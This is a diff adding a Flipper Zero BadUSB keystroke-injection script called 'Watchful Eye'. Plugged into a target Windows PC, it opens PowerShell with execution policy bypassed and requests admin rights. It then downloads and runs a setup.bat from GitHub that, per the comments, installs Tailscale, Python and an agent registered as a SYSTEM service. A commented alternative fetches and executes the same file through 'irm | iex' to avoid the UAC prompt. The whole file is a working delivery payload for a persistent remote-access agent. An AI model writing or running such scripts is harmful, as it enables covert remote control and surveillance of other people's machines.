@@ -1,0 +1,79 @@
+# Watchful Eye - Flipper Zero BadUSB Script
+# 
+# Plug Flipper into any Windows PC to auto-install Watchful Eye
+# The script will:
+#   1. Open PowerShell as admin (user clicks Yes on UAC)
+#   2. Download setup.bat from GitHub
+#   3. Run the setup automatically
+#
+# PREREQUISITES:
+#   1. Replace YOUR_GITHUB_USERNAME below with your actual GitHub username
+#   2. Upload the github-pages and setup.bat to your GitHub repo
+#   3. Copy this file to: Flipper SD:/badusb/WatchfulEye/
+#
+# TO USE:
+#   1. On Flipper, go to BadUSB
+#   2. Select "WatchfulEye"
+#   3. Plug Flipper into target PC via USB
+#   4. Press center button to run
+#   5. Click "Yes" on the UAC admin prompt
+
+REM Title: Watchful Eye Setup
+REM Author: Watchful Eye
+REM Target: Windows 10/11
+REM Description: Auto-installs Watchful Eye agent on target PC
+
+REM ===== CONFIGURATION =====
+REM Change this to your GitHub username
+DEFINE #GITHUB_USER YOUR_GITHUB_USERNAME
+DEFINE #REPO_NAME Watchful-Eye
+DEFINE #BRANCH main
+
+REM ===== SCRIPT START =====
+
+REM Open Run dialog
+DELAY 500
+GUI r
+DELAY 500
+
+REM Open PowerShell as admin via Run dialog
+REM This technique opens an elevated PowerShell window
+STRING powershell -Command "Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -Command \"\"' -Verb RunAs"
+DELAY 200
+ENTER
+
+REM Wait for UAC prompt
+DELAY 2000
+
+REM The user must click "Yes" on UAC
+REM After UAC is accepted, the elevated PowerShell window opens
+
+REM Now we need to type in the elevated PowerShell window
+REM Wait for it to be ready
+DELAY 1000
+
+REM Download and run setup.bat from GitHub
+STRING $url = "https://raw.githubusercontent.com/#GITHUB_USER/#REPO_NAME/#BRANCH/setup.bat"; $tempFile = "$env:TEMP\watchful_eye_setup.bat"; Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing; Start-Process cmd -ArgumentList "/c $tempFile" -Verb RunAs; Write-Host "Setup started!"; Start-Sleep 5
+DELAY 100
+ENTER
+
+REM Done - setup.bat will handle everything else
+REM The script installs:
+REM   - Tailscale VPN
+REM   - Python 3.11
+REM   - Watchful Eye agent
+REM   - Registers SYSTEM service
+REM   - Starts the agent
+
+REM ===== ALTERNATIVE: NO UAC METHOD =====
+REM If you want to avoid UAC entirely, uncomment the lines below
+REM and comment out the UAC method above.
+REM
+REM This method runs as current user (limited permissions)
+REM but can still install most components.
+REM
+REM GUI r
+REM DELAY 500
+REM STRING powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/#GITHUB_USER/#REPO_NAME/#BRANCH/setup.bat | iex"
+REM DELAY 200
+REM ENTER
